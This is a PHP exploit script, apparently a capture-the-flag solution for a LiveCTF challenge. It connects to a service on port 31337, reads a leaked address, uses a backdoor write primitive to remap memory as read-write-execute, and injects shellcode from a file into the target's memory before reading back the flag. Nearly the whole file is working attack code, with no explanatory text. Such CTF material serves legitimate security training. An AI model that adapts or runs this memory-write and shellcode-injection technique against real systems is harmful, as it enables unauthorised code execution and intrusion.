<?php
$env = getenv("HOST");
define("HOST", $env ? $env : "localhost");
define("PORT", 31337);

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}


printf("[*] Opening connection\n");
$time = microtime(true);
$fp = fsockopen(HOST, PORT);
printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");


$leak = unpack("P", fread($fp, 8))[1];
printf("[+] Leak: %X\n", $leak);
assert(0 === ($leak & 0xFFF));
assert(0 === ($leak >> 48));


fwrite($fp, pack("P*", $leak + 0x4330, $leak + 0x1370)); // remap rwx
fwrite($fp, pack("P*", $leak + 0x4338, $leak + 0x2000)); // backdoor again
fwrite($fp, pack("P*", 0)); // end

fwrite($fp, pack("V*", 0)); // win the game
expectLine($fp, "Correct!");

// second backdoor call
expect($fp, pack("P", $leak));

$addr = $leak + 0x00002158;
$shellcode = file_get_contents("shellcode");
foreach(str_split($shellcode, 8) as $i => $q) {
	$q = str_pad($q, 8, "\x00");
	$n = unpack("P", $q)[1];

	fwrite($fp, pack("P*", $addr + 8 * $i, $n));
}
fwrite($fp, pack("P*", 0));

dump:
while($line = fgets($fp)) {
	echo $line;

	if(false !== strpos($line, "LiveCTF"))
		break;
}
